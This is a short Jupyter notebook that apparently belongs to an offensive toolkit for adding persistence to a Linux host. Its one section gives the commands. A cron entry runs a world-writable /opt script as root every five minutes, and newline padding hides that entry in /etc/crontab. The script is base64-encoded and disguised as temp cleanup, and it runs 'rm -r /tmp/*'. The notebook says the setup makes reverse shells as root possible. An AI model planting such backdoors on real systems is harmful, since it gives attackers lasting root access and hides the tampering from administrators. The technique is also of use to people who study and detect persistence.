{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Linux Add Persistance\n",
    "This notebook is built to add persistance to a linux host"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Global Settings"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"index\"></a>\n",
    "## Index\n",
    "\n",
    "[Add crontab to execute a script as root](#crontab)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"crontab\"></a>\n",
    "\n",
    "## Add Crontab to Execute a Script as root\n",
    "\n",
    "[Return to Index](#index)\n",
    "\n",
    "<b>Summary:</b>\n",
    "This creates a python script in /opt that can be modified by all users.  The python script if called cleantemp executes from /etc/crontab every 5 minutes.  This would allow a reverse shell or other commands to be executed.  To kindof hide it from initial view of an editor in /etc/crontab add a lot of newlines in the front.  If you store files in /tmp this is not a good solution.\n",
    "\n",
    "<b>Execution:</b>\n",
    "You must have a privileged account to execute this\n",
    "\n",
    "<b>Setup:</b>\n",
    "````\n",
    "touch /opt/cleantemp.py\n",
    "echo -e \"\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n*/5 * * * * python /opt/cleantemp.py\" >> /etc/crontab\n",
    "# Contents of cleanuptemp.py\n",
    "#!/usr/bin/env python\\nimport os\\n# Clean up temp files on a regular basis\\nos.system('rm -r /tmp/*')\" \n",
    "\n",
    "echo \"IyEvdXNyL2Jpbi9lbnYgcHl0aG9uCmltcG9ydCBvcwojIENsZWFuIHVwIHRlbXAgZmlsZXMgb24gYSByZWd1bGFyIGJhc2lzCm9zLnN5c3RlbSgncm0gLXIgL3RtcC8qJykK\" | base64 -d > /opt/cleantemp.py\n",
    "\n",
    "chmod 777 cleantemp.py\n",
    "````"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
